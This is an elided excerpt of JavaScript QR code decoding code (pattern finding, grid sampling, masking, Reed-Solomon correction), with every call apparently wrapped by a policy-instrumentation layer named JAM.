...
function v154(patterns) {
  function distance(pattern1$$1, pattern2$$1) {
    ...
    return JAM.call(Math.sqrt, Math, [xDiff * xDiff + yDiff * yDiff], JAM.policy.p37);
  }
...
function v153(from, to) {
  ...
  var rest = JAM.call(this.slice, this, [v1070], JAM.policy.p37);
  var v172;
  if (from < 0) {
  ...
  this.length = v172;
  var v173 = this.push;
  return JAM.call(v173.apply, v173, [this, rest], JAM.policy.p36);
}
function v152() {
  ...
  for (;v177;) {
    ...
    for (;v176;) {
      var gray$$1 = JAM.call(qrcode.getPixel, qrcode, [x$$61, y$$43], JAM.policy.p36);
...
function v151(grayScale) {
  var middle$$1 = JAM.call(qrcode.getMiddleBrightnessPerArea, qrcode, [grayScale], JAM.policy.p37);
  var sqrtNumArea = middle$$1.length;
  var areaWidth$$1 = JAM.call(Math.floor, Math, [qrcode.width / sqrtNumArea], JAM.policy.p37);
  var areaHeight$$1 = JAM.call(Math.floor, Math, [qrcode.height / sqrtNumArea], JAM.policy.p37);
...
function v150(image$$7) {
  var numSqrtArea = 4;
  var areaWidth = JAM.call(Math.floor, Math, [qrcode.width / numSqrtArea], JAM.policy.p37);
  var areaHeight = JAM.call(Math.floor, Math, [qrcode.height / numSqrtArea], JAM.policy.p37);
  ...
  for (;v201;) {
    ...
    for (;v200;) {
      ...
      for (;v199;) {
        ...
        for (;v198;) {
          var target$$26 = image$$7[areaWidth * ax + dx$$5 + (areaHeight * ay + dy$$5) * qrcode.width];
  ...
  for (;v206;) {
    ...
    for (;v205;) {
      var v203 = middle[ax];
      var v204 = ay;
      var v2844 = JAM.call(Math.floor, Math, [(minmax[ax][ay][0] + minmax[ax][ay][1]) / 2], JAM.policy.p37);
      v203[v204] = v2844;
      ax = ax + 1;
      v205 = ax < numSqrtArea;
    }
...
function v149(th) {
  ...
  for (;v210;) {
    ...
    for (;v209;) {
      var gray = JAM.call(qrcode.getPixel, qrcode, [x$$60, y$$42], JAM.policy.p36);
...
function v147(ctx) {
  ...
  var img$$3 = JAM.call(qrcode.grayScaleToBitmap, qrcode, [JAM.call(qrcode.grayscale, qrcode, [], JAM.policy.p27)], JAM.policy.p37);
  if (qrcode.debug) {
    var y$$40 = 0;
    ...
    for (;v226;) {
      ...
      for (;v225;) {
        ...
        var v1114;
        if (img$$3[x$$58 + y$$40 * qrcode.width]) {
          v1114 = 0;
        } else {
          v1114 = 0;
        }
    ...
    JAM.call(ctx.putImageData, ctx, [qrcode.imagedata, 0, 0], JAM.policy.p37);
  }
  ...
  var reader$$1 = JAM.call(Decoder.decode, Decoder, [qRCodeMatrix.bits], JAM.policy.p37);
  ...
  for (;v233;) {
    ...
    for (;v232;) {
      str$$6 = str$$6 + JAM.call(String.fromCharCode, String, [data$$18[i$$45][j$$24]], JAM.policy.p37);
      j$$24 = j$$24 + 1;
  ...
  return JAM.call(qrcode.decode_utf8, qrcode, [str$$6], JAM.policy.p37);
}
function v146(s$$4) {
...
function v145(src$$1) {
  function v144() {
    JAM.call(console.log, console, ["Image failed!"], JAM.policy.p26);
    return;
  }
  function v143() {
    ...
    if (canvas_out !== null) {
      ...
      JAM.call(outctx.drawImage, outctx, [img$$2, 0, 0, 320, 240], JAM.policy.p37);
    }
    canvas_qr$$1.width = img$$2.width;
    canvas_qr$$1.height = img$$2.height;
    JAM.call(context$$1.drawImage, context$$1, [img$$2, 0, 0], JAM.policy.p37);
    qrcode.width = img$$2.width;
    qrcode.height = img$$2.height;
    try {
      var v238 = qrcode;
      var v2845 = JAM.call(context$$1.getImageData, context$$1, [0, 0, img$$2.width, img$$2.height], JAM.policy.p27);
      v238.imagedata = v2845;
    } catch (e$$5) {
      qrcode.result = "Cross domain image reading not supported in your browser! Save it to your computer then drag and drop the file!";
      if (qrcode.callback !== null) {
        JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p37);
      }
      return;
    }
    try {
      var v241 = qrcode;
      var v2846 = JAM.call(qrcode.process, qrcode, [context$$1], JAM.policy.p37);
      v241.result = v2846;
    } catch (e$$6) {
      JAM.call(console.log, console, [e$$6], JAM.policy.p37);
  ...
  if (arguments.length === 0) {
    ...
    var v244 = qrcode;
    var v2847 = JAM.call(context.getImageData, context, [0, 0, qrcode.width, qrcode.height], JAM.policy.p27);
    v244.imagedata = v2847;
    var v245 = qrcode;
    var v2848 = JAM.call(qrcode.process, qrcode, [context], JAM.policy.p37);
    v245.result = v2848;
    if (qrcode.callback !== null) {
      JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p37);
    }
...
function v142(bits$$13) {
  ...
  var dataBlocks = JAM.call(DataBlock.getDataBlocks, DataBlock, [codewords$$1, version$$7, ecLevel$$2], JAM.policy.p36);
  var totalBytes = 0;
  var i$$44 = 0;
  ...
  for (;v253;) {
    ...
    JAM.call(this.correctErrors, this, [codewordBytes$$1, numDataCodewords$$3], JAM.policy.p36);
    i$$44 = 0;
...
function v141(codewordBytes, numDataCodewords$$2) {
  ...
  try {
    ...
    JAM.call(v259.decode, v259, [codewordsInts, numECCodewords], JAM.policy.p36);
  } catch (rse) {
    throw rse;
  }
  i$$43 = 0;
...
function v138(rawCodewords, version$$5, ecLevel$$1) {
  ...
  var ecBlocks = JAM.call(version$$5.getECBlocksForLevel, version$$5, [ecLevel$$1], JAM.policy.p37);
  var totalBlocks = 0;
...
function v136(maskedFormatInfo$$1) {
  ...
  for (;v290;) {
    ...
    var bitsDifference$$1 = JAM.call(this.numBitsDiffering, this, [maskedFormatInfo$$1, targetInfo], JAM.policy.p36);
...
function v135(maskedFormatInfo) {
  var formatInfo$$1 = JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo], JAM.policy.p37);
  if (formatInfo$$1 !== null) {
    return formatInfo$$1;
  }
  return JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo ^ FORMAT_INFO_MASK_QR], JAM.policy.p37);
}
function v134(a, b) {
  a = a ^ b;
...
function v133(x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2) {
  var v296 = JAM.call(this.squareToQuadrilateral, this, [x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2], JAM.policy.p36);
  return JAM.call(v296.buildAdjoint, v296, [], JAM.policy.p27);
}
...
function v131(x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3, x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p) {
  var qToS = JAM.call(this.quadrilateralToSquare, this, [x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3], JAM.policy.p36);
  var sToQ = JAM.call(this.squareToQuadrilateral, this, [x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p], JAM.policy.p36);
  return JAM.call(sToQ.times, sToQ, [qToS], JAM.policy.p37);
}
function v130(versionBits) {
  ...
  for (;v316;) {
    ...
    if (targetVersion === versionBits) {
      return JAM.call(this.getVersionForNumber, this, [i$$4 + 7], JAM.policy.p37);
    }
    var bitsDifference = JAM.call(FormatInformation.numBitsDiffering, FormatInformation, [versionBits, targetVersion], JAM.policy.p36);
  ...
  if (bestDifference <= 3) {
    return JAM.call(this.getVersionForNumber, this, [bestVersion], JAM.policy.p37);
  }
  return null;
}
function v129(dimension$$3) {
  ...
  try {
    return JAM.call(Version.getVersionForNumber, Version, [dimension$$3 - 17 >> 2], JAM.policy.p37);
  } catch (iae) {
...
function v127(image$$4, dimension$$1, p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY) {
  var transform$$1 = JAM.call(PerspectiveTransform.quadrilateralToQuadrilateral, PerspectiveTransform, [p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY], JAM.policy.p36);
  return JAM.call(GridSampler.sampleGrid3, GridSampler, [image$$4, dimension$$1, transform$$1], JAM.policy.p36);
}
function v126(image$$3, dimension, transform) {
  ...
  for (;v340;) {
    ...
    JAM.call(transform.transformPoints1, transform, [points$$1], JAM.policy.p37);
    JAM.call(GridSampler.checkAndNudgePoints, GridSampler, [image$$3, points$$1], JAM.policy.p36);
    try {
      x$$48 = 0;
      var v339 = x$$48 < max;
      for (;v339;) {
        var xpoint = JAM.call(Math.floor, Math, [points$$1[x$$48]], JAM.policy.p37) * 4 + JAM.call(Math.floor, Math, [points$$1[x$$48 + 1]], JAM.policy.p37) * qrcode.width * 4;
        var bit = image$$3[JAM.call(Math.floor, Math, [points$$1[x$$48]], JAM.policy.p37) + qrcode.width * JAM.call(Math.floor, Math, [points$$1[x$$48 + 1]], JAM.policy.p37)];
        ...
        if (bit) {
          JAM.call(bits.set_Renamed, bits, [x$$48 >> 1, y$$31], JAM.policy.p27);
        }
        x$$48 = x$$48 + 2;
        v339 = x$$48 < max;
      }
...
function v125(image$$2, points) {
  ...
  var v350 = v1198;
  for (;v350;) {
    var x$$47 = JAM.call(Math.floor, Math, [points[offset$$8]], JAM.policy.p37);
    var y$$30 = JAM.call(Math.floor, Math, [points[offset$$8 + 1]], JAM.policy.p37);
    var v2530 = x$$47 < -1;
    if (!v2530) {
      v2530 = x$$47 > width$$9;
    }
  ...
  var v361 = v1202;
  for (;v361;) {
    x$$47 = JAM.call(Math.floor, Math, [points[offset$$8]], JAM.policy.p37);
    y$$30 = JAM.call(Math.floor, Math, [points[offset$$8 + 1]], JAM.policy.p37);
    var v2532 = x$$47 < -1;
    if (!v2532) {
      v2532 = x$$47 > width$$9;
    }
  ...
  function v10() {
    ...
    for (;v374;) {
      ...
      for (;v373;) {
        ...
        JAM.call(bitMatrix.setRegion, bitMatrix, [this.alignmentPatternCenters[y$$32] - 2, i$$3, 5, 5], JAM.policy.p27);
        y$$32 = y$$32 + 1;
        v373 = y$$32 < max$$1;
      }
      x$$49 = x$$49 + 1;
...
function Detector(image$$5) {
  function v26() {
    ...
    var info$$1 = JAM.call(v450.findFinderPattern, v450, [this.image], JAM.policy.p37);
    return JAM.call(this.processFinderPatternInfo, this, [info$$1], JAM.policy.p37);
  }
  function v25(info) {
    var topLeft$$3 = info.TopLeft;
    var topRight$$3 = info.TopRight;
    var bottomLeft$$3 = info.BottomLeft;
    var moduleSize$$1 = JAM.call(this.calculateModuleSize, this, [topLeft$$3, topRight$$3, bottomLeft$$3], JAM.policy.p36);
    if (moduleSize$$1 < 1) {
      throw "Error";
    }
    var dimension$$7 = JAM.call(this.computeDimension, this, [topLeft$$3, topRight$$3, bottomLeft$$3, moduleSize$$1], JAM.policy.p36);
    var provisionalVersion = JAM.call(Version.getProvisionalVersionForDimension, Version, [dimension$$7], JAM.policy.p37);
    ...
    if (provisionalVersion.AlignmentPatternCenters.length > 0) {
      ...
      var estAlignmentX$$1 = JAM.call(Math.floor, Math, [topLeft$$3.X + correctionToTopLeft * (bottomRightX$$1 - topLeft$$3.X)], JAM.policy.p37);
      var estAlignmentY$$1 = JAM.call(Math.floor, Math, [topLeft$$3.Y + correctionToTopLeft * (bottomRightY$$1 - topLeft$$3.Y)], JAM.policy.p37);
      var i$$7 = 4;
      var v461 = i$$7 <= 16;
      for (;v461;) {
        alignmentPattern$$1 = JAM.call(this.findAlignmentInRegion, this, [moduleSize$$1, estAlignmentX$$1, estAlignmentY$$1, i$$7], JAM.policy.p36);
        break;
      }
    }
    var transform$$4 = JAM.call(this.createTransform, this, [topLeft$$3, topRight$$3, bottomLeft$$3, alignmentPattern$$1, dimension$$7], JAM.policy.p36);
    var bits$$2 = JAM.call(this.sampleGrid, this, [this.image, transform$$4, dimension$$7], JAM.policy.p36);
    var points$$4;
  ...
  function v24(image$$6, transform$$3, dimension$$6) {
    ...
    return JAM.call(sampler.sampleGrid3, sampler, [image$$6, dimension$$6, transform$$3], JAM.policy.p36);
  }
  ...
  function v22(overallEstModuleSize, estAlignmentX, estAlignmentY, allowanceFactor) {
    var allowance = JAM.call(Math.floor, Math, [allowanceFactor * overallEstModuleSize], JAM.policy.p37);
    var alignmentAreaLeftX = JAM.call(Math.max, Math, [0, estAlignmentX - allowance], JAM.policy.p27);
    var alignmentAreaRightX = JAM.call(Math.min, Math, [qrcode.width - 1, estAlignmentX + allowance], JAM.policy.p36);
    if (alignmentAreaRightX - alignmentAreaLeftX < overallEstModuleSize * 3) {
      throw "Error";
    }
    var alignmentAreaTopY = JAM.call(Math.max, Math, [0, estAlignmentY - allowance], JAM.policy.p27);
    var alignmentAreaBottomY = JAM.call(Math.min, Math, [qrcode.height - 1, estAlignmentY + allowance], JAM.policy.p36);
  ...
  function v21(topLeft$$1, topRight$$1, bottomLeft$$1, moduleSize) {
    var tltrCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, topRight$$1], JAM.policy.p36) / moduleSize], JAM.policy.p37);
    var tlblCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, bottomLeft$$1], JAM.policy.p36) / moduleSize], JAM.policy.p37);
  ...
  function v19(topLeft, topRight, bottomLeft) {
    return(JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, topRight], JAM.policy.p36) + JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, bottomLeft], JAM.policy.p36)) / 2;
  }
  function v18(pattern$$1, otherPattern) {
    var moduleSizeEst1 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p37), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p37), JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p37), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p37)], JAM.policy.p36);
    var moduleSizeEst2 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p37), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p37), JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p37), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p37)], JAM.policy.p36);
  ...
  function v17(fromX$$1, fromY$$1, toX$$1, toY$$1) {
    var result = JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, toX$$1, toY$$1], JAM.policy.p36);
    var scale = 1;
    ...
    var otherToY = JAM.call(Math.floor, Math, [fromY$$1 - (toY$$1 - fromY$$1) * scale], JAM.policy.p37);
    scale = 1;
    if (otherToY < 0) {
    ...
    otherToX = JAM.call(Math.floor, Math, [fromX$$1 + (otherToX - fromX$$1) * scale], JAM.policy.p37);
    result = result + JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, otherToX, otherToY], JAM.policy.p36);
    return result - 1;
  }
  function v16(fromX, fromY, toX, toY) {
    var steep = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p37) > JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p37);
    if (steep) {
      var temp = fromX;
      fromX = fromY;
      fromY = temp;
    ...
    var dx$$4 = JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p37);
    var dy$$4 = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p37);
    var error$$1 = -dx$$4 >> 1;
    var v529;
    if (fromY < toY) {
      v529 = 1;
    ...
    for (;v540;) {
      ...
      if (state === 3) {
        ...
        return JAM.call(Math.sqrt, Math, [diffX * diffX + diffY * diffY], JAM.policy.p37);
      }
    ...
    return JAM.call(Math.sqrt, Math, [diffX2 * diffX2 + diffY2 * diffY2], JAM.policy.p37);
  }
  this.image = image$$5;
...
function FormatInformation(formatInfo) {
  ...
  var v2853 = JAM.call(ErrorCorrectionLevel.forBits, ErrorCorrectionLevel, [formatInfo >> 3 & 3], JAM.policy.p37);
...
function BitMatrix(width$$10, height$$9) {
  ...
  function v39(x$$55, y$$38) {
    ...
    var v558 = this.bits;
    v558[offset$$11] = v558[offset$$11] ^ 1 << (x$$55 & 31);
    return;
  }
  function v38(x$$54, y$$37) {
    var offset$$10 = y$$37 * this.rowSize + (x$$54 >> 5);
    var v561 = this.bits;
    v561[offset$$10] = v561[offset$$10] | 1 << (x$$54 & 31);
    return;
  }
...
function BitMatrixParser(bitMatrix$$1) {
  function v47() {
    ...
    var dataMask$$1 = JAM.call(DataMask.forReference, DataMask, [formatInfo$$2.DataMask], JAM.policy.p37);
    var dimension$$11 = this.bitMatrix.Dimension;
    JAM.call(dataMask$$1.unmaskBitMatrix, dataMask$$1, [this.bitMatrix, dimension$$11], JAM.policy.p36);
    ...
    for (;v584;) {
      ...
      for (;v583;) {
        ...
        var v582 = col < 2;
        for (;v582;) {
          if (!JAM.call(functionPattern.get_Renamed, functionPattern, [j$$4 - col, i$$15], JAM.policy.p36)) {
            bitsRead = bitsRead + 1;
            currentByte = currentByte << 1;
            var v1536 = this.bitMatrix;
            if (JAM.call(v1536.get_Renamed, v1536, [j$$4 - col, i$$15], JAM.policy.p36)) {
              currentByte = currentByte | 1;
            }
            if (bitsRead === 8) {
  ...
  function v46() {
    ...
    if (provisionalVersion$$1 <= 6) {
      return JAM.call(Version.getVersionForNumber, Version, [provisionalVersion$$1], JAM.policy.p37);
    }
    var versionBits$$2 = 0;
    ...
    var v2855 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p37);
    ...
    var v2856 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p37);
  ...
  function v45() {
    ...
    var v2857 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p37);
    ...
    var v2858 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p37);
  ...
  function v44(i$$12, j$$1, versionBits$$1) {
    ...
    if (JAM.call(v2314.get_Renamed, v2314, [i$$12, j$$1], JAM.policy.p36)) {
...
function DataMask000() {
  ...
  function v48(bits$$5, dimension$$12) {
    ...
    for (;v609;) {
      ...
      for (;v608;) {
        if (JAM.call(this.isMasked, this, [i$$16, j$$5], JAM.policy.p36)) {
...
function DataMask001() {
  ...
  function v50(bits$$6, dimension$$13) {
    ...
    for (;v613;) {
      ...
      for (;v612;) {
        if (JAM.call(this.isMasked, this, [i$$18, j$$7], JAM.policy.p36)) {
...
function DataMask010() {
  ...
  function v52(bits$$7, dimension$$14) {
    ...
    for (;v617;) {
      ...
      for (;v616;) {
        if (JAM.call(this.isMasked, this, [i$$20, j$$9], JAM.policy.p36)) {
...
function DataMask011() {
  ...
  function v54(bits$$8, dimension$$15) {
    ...
    for (;v621;) {
      ...
      for (;v620;) {
        if (JAM.call(this.isMasked, this, [i$$22, j$$11], JAM.policy.p36)) {
...
function DataMask100() {
  ...
  function v56(bits$$9, dimension$$16) {
    ...
    for (;v625;) {
      ...
      for (;v624;) {
        if (JAM.call(this.isMasked, this, [i$$24, j$$13], JAM.policy.p36)) {
...
function DataMask101() {
  ...
  function v58(bits$$10, dimension$$17) {
    ...
    for (;v629;) {
      ...
      for (;v628;) {
        if (JAM.call(this.isMasked, this, [i$$26, j$$15], JAM.policy.p36)) {
...
function DataMask110() {
  ...
  function v60(bits$$11, dimension$$18) {
    ...
    for (;v633;) {
      ...
      for (;v632;) {
        if (JAM.call(this.isMasked, this, [i$$28, j$$17], JAM.policy.p36)) {
...
function DataMask111() {
  ...
  function v62(bits$$12, dimension$$19) {
    ...
    for (;v637;) {
      ...
      for (;v636;) {
        if (JAM.call(this.isMasked, this, [i$$30, j$$19], JAM.policy.p36)) {
...
function ReedSolomonDecoder(field) {
  function v67(errorEvaluator, errorLocations$$1, dataMatrix$$1) {
    ...
    for (;v648;) {
      var v638 = this.field;
      var xiInverse = JAM.call(v638.inverse, v638, [errorLocations$$1[i$$34]], JAM.policy.p37);
      var denominator$$3 = 1;
      var j$$21 = 0;
      var v643 = j$$21 < s$$3;
      for (;v643;) {
        if (i$$34 !== j$$21) {
          ...
          denominator$$3 = JAM.call(v640.multiply, v640, [denominator$$3, JAM.call(GF256.addOrSubtract, GF256, [1, JAM.call(v2323.multiply, v2323, [errorLocations$$1[j$$21], xiInverse], JAM.policy.p36)], JAM.policy.p27)], JAM.policy.p36);
        }
        j$$21 = j$$21 + 1;
        v643 = j$$21 < s$$3;
      }
      ...
      var v1557 = JAM.call(errorEvaluator.evaluateAt, errorEvaluator, [xiInverse], JAM.policy.p37);
      var v2325 = this.field;
      var v2859 = JAM.call(v1556.multiply, v1556, [v1557, JAM.call(v2325.inverse, v2325, [denominator$$3], JAM.policy.p37)], JAM.policy.p36);
      v644[v645] = v2859;
      if (dataMatrix$$1) {
        var v646 = result$$4;
        var v647 = i$$34;
        var v1559 = this.field;
        var v2860 = JAM.call(v1559.multiply, v1559, [result$$4[i$$34], xiInverse], JAM.policy.p36);
        v646[v647] = v2860;
      }
      i$$34 = i$$34 + 1;
      v648 = i$$34 < s$$3;
  ...
  function v66(errorLocator) {
    ...
    var v654 = v1561;
    for (;v654;) {
      if (JAM.call(errorLocator.evaluateAt, errorLocator, [i$$33], JAM.policy.p37) === 0) {
        var v651 = result$$3;
        var v652 = e$$4;
        var v1563 = this.field;
        var v2861 = JAM.call(v1563.inverse, v1563, [i$$33], JAM.policy.p37);
        v651[v652] = v2861;
        e$$4 = e$$4 + 1;
      }
      i$$33 = i$$33 + 1;
  ...
  function v65(a$$1, b$$1, R) {
    ...
    var v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p37);
    for (;v674;) {
      var rLastLast = rLast;
      var sLastLast = sLast;
      var tLastLast = tLast;
      ...
      var denominatorLeadingTerm = JAM.call(rLast.getCoefficient, rLast, [rLast.Degree], JAM.policy.p37);
      var v664 = this.field;
      var dltInverse = JAM.call(v664.inverse, v664, [denominatorLeadingTerm], JAM.policy.p37);
      ...
      for (;v671;) {
        ...
        var v667 = this.field;
        var scale$$1 = JAM.call(v667.multiply, v667, [JAM.call(r.getCoefficient, r, [r.Degree], JAM.policy.p37), dltInverse], JAM.policy.p36);
        var v1571 = this.field;
        q = JAM.call(q.addOrSubtract, q, [JAM.call(v1571.buildMonomial, v1571, [degreeDiff, scale$$1], JAM.policy.p36)], JAM.policy.p37);
        r = JAM.call(r.addOrSubtract, r, [JAM.call(rLast.multiplyByMonomial, rLast, [degreeDiff, scale$$1], JAM.policy.p36)], JAM.policy.p37);
      ...
      var v672 = JAM.call(q.multiply1, q, [sLast], JAM.policy.p37);
      s$$2 = JAM.call(v672.addOrSubtract, v672, [sLastLast], JAM.policy.p37);
      var v673 = JAM.call(q.multiply1, q, [tLast], JAM.policy.p37);
      t = JAM.call(v673.addOrSubtract, v673, [tLastLast], JAM.policy.p37);
      v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p37);
    }
    ...
    var v676 = this.field;
    var inverse = JAM.call(v676.inverse, v676, [sigmaTildeAtZero], JAM.policy.p37);
    var sigma$$1 = JAM.call(t.multiply2, t, [inverse], JAM.policy.p37);
    var omega$$1 = JAM.call(r.multiply2, r, [inverse], JAM.policy.p37);
  ...
  function v64(received, twoS) {
    ...
    for (;v682;) {
      ...
      var evalx = JAM.call(poly.evaluateAt, poly, [JAM.call(v1577.exp, v1577, [v2334], JAM.policy.p37)], JAM.policy.p37);
      syndromeCoefficients[syndromeCoefficients.length - 1 - i$$32] = evalx;
      if (evalx !== 0) {
        noError = false;
      }
      i$$32 = i$$32 + 1;
    ...
    var sigmaOmega = JAM.call(this.runEuclideanAlgorithm, this, [JAM.call(v1580.buildMonomial, v1580, [twoS, 1], JAM.policy.p37), syndrome, twoS], JAM.policy.p36);
    var sigma = sigmaOmega[0];
    var omega = sigmaOmega[1];
    var errorLocations = JAM.call(this.findErrorLocations, this, [sigma], JAM.policy.p37);
    var errorMagnitudes = JAM.call(this.findErrorMagnitudes, this, [omega, errorLocations, dataMatrix], JAM.policy.p36);
    i$$32 = 0;
    var v690 = i$$32 < errorLocations.length;
    for (;v690;) {
      var v685 = received.length - 1;
      var v1583 = this.field;
      var position = v685 - JAM.call(v1583.log, v1583, [errorLocations[i$$32]], JAM.policy.p37);
      if (position < 0) {
        throw "ReedSolomonException Bad error location";
      }
      var v688 = received;
      var v689 = position;
      var v2862 = JAM.call(GF256.addOrSubtract, GF256, [received[position], errorMagnitudes[i$$32]], JAM.policy.p36);
      v688[v689] = v2862;
      i$$32 = i$$32 + 1;
...
function GF256Poly(field$$1, coefficients) {
  function v77(other$$8) {
    ...
    var remainder = this;
    var denominatorLeadingTerm$$1 = JAM.call(other$$8.getCoefficient, other$$8, [other$$8.Degree], JAM.policy.p37);
    var v695 = this.field;
    var inverseDenominatorLeadingTerm = JAM.call(v695.inverse, v695, [denominatorLeadingTerm$$1], JAM.policy.p37);
    ...
    for (;v701;) {
      ...
      var v698 = this.field;
      var scale$$2 = JAM.call(v698.multiply, v698, [JAM.call(remainder.getCoefficient, remainder, [remainder.Degree], JAM.policy.p37), inverseDenominatorLeadingTerm], JAM.policy.p36);
      var term = JAM.call(other$$8.multiplyByMonomial, other$$8, [degreeDifference, scale$$2], JAM.policy.p36);
      var v700 = this.field;
      var iterationQuotient = JAM.call(v700.buildMonomial, v700, [degreeDifference, scale$$2], JAM.policy.p36);
      quotient = JAM.call(quotient.addOrSubtract, quotient, [iterationQuotient], JAM.policy.p37);
      remainder = JAM.call(remainder.addOrSubtract, remainder, [term], JAM.policy.p37);
  ...
  function v76(degree$$1, coefficient) {
    ...
    for (;v710;) {
      ...
      var v2863 = JAM.call(v1595.multiply, v1595, [this.coefficients[i$$40], coefficient], JAM.policy.p36);
      v708[v709] = v2863;
      i$$40 = i$$40 + 1;
      v710 = i$$40 < size$$6;
    }
  ...
  function v75(scalar) {
    ...
    for (;v718;) {
      ...
      var v2864 = JAM.call(v1597.multiply, v1597, [this.coefficients[i$$39], scalar], JAM.policy.p36);
      v716[v717] = v2864;
      i$$39 = i$$39 + 1;
      v718 = i$$39 < size$$5;
    }
  ...
  function v74(other$$7) {
    ...
    for (;v727;) {
      ...
      for (;v726;) {
        ...
        var v2865 = JAM.call(GF256.addOrSubtract, GF256, [v1603, JAM.call(v2346.multiply, v2346, [aCoeff, bCoefficients[j$$22]], JAM.policy.p36)], JAM.policy.p36);
        v724[v725] = v2865;
        j$$22 = j$$22 + 1;
        v726 = j$$22 < bLength;
      }
  ...
  function v73(other$$6) {
    ...
    for (;v739;) {
      var v737 = sumDiff;
      var v738 = i$$37;
      var v2866 = JAM.call(GF256.addOrSubtract, GF256, [smallerCoefficients[i$$37 - lengthDiff], largerCoefficients[i$$37]], JAM.policy.p36);
      v737[v738] = v2866;
      i$$37 = i$$37 + 1;
  ...
  function v72(a$$2) {
    ...
    if (a$$2 === 1) {
      ...
      for (;v743;) {
        result$$5 = JAM.call(GF256.addOrSubtract, GF256, [result$$5, this.coefficients[i$$36]], JAM.policy.p36);
        i$$36 = i$$36 + 1;
        v743 = i$$36 < size$$4;
      }
      return result$$5;
    ...
    for (;v748;) {
      ...
      result2 = JAM.call(GF256.addOrSubtract, GF256, [JAM.call(v1614.multiply, v1614, [a$$2, result2], JAM.policy.p36), this.coefficients[i$$36]], JAM.policy.p36);
      i$$36 = i$$36 + 1;
      v748 = i$$36 < size$$4;
    }
    return result2;
...
function FinderPattern(posX, posY, estimatedModuleSize) {
  function v90(moduleSize$$2, i$$47, j$$25) {
    var v1635 = JAM.call(Math.abs, Math, [i$$47 - this.y], JAM.policy.p37) <= moduleSize$$2;
    if (v1635) {
      v1635 = JAM.call(Math.abs, Math, [j$$25 - this.x], JAM.policy.p37) <= moduleSize$$2;
    }
    if (v1635) {
      var moduleSizeDiff = JAM.call(Math.abs, Math, [moduleSize$$2 - this.estimatedModuleSize], JAM.policy.p37);
...
function FinderPatternFinder() {
  function v105(image$$10) {
    ...
    var iSkip = JAM.call(Math.floor, Math, [3 * maxI$$1 / (4 * MAX_MODULES)], JAM.policy.p37);
    ...
    for (;v805;) {
      ...
      for (;v802;) {
        if (image$$10[j$$28 + i$$54 * qrcode.width]) {
          ...
          if ((currentState & 1) === 0) {
            if (currentState === 4) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p37)) {
                var confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, j$$28], JAM.policy.p36);
                if (confirmed) {
                  iSkip = 2;
                  if (this.hasSkipped) {
      ...
      if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p37)) {
        confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, maxJ$$1], JAM.policy.p36);
        if (confirmed) {
    ...
    JAM.call(qrcode.orderBestPatterns, qrcode, [patternInfo], JAM.policy.p37);
  ...
  function v104() {
    ...
    for (;v812;) {
      ...
      totalDeviation = totalDeviation + JAM.call(Math.abs, Math, [pattern$$3.EstimatedModuleSize - average$$1], JAM.policy.p37);
      i$$53 = i$$53 + 1;
      v812 = i$$53 < max$$7;
    }
    ...
    for (;v820;) {
      ...
      if (center$$1.Count >= CENTER_QUORUM) {
        if (firstConfirmedCenter === null) {
          ...
          return JAM.call(Math.floor, Math, [(JAM.call(Math.abs, Math, [firstConfirmedCenter.X - center$$1.X], JAM.policy.p37) - JAM.call(Math.abs, Math, [firstConfirmedCenter.Y - center$$1.Y], JAM.policy.p37)) / 2], JAM.policy.p37);
        }
      }
      i$$52 = i$$52 + 1;
      v820 = i$$52 < max$$6;
  ...
  function v102() {
    ...
    function v100(center1, center2) {
      var dA = JAM.call(Math.abs, Math, [center2.EstimatedModuleSize - average], JAM.policy.p37);
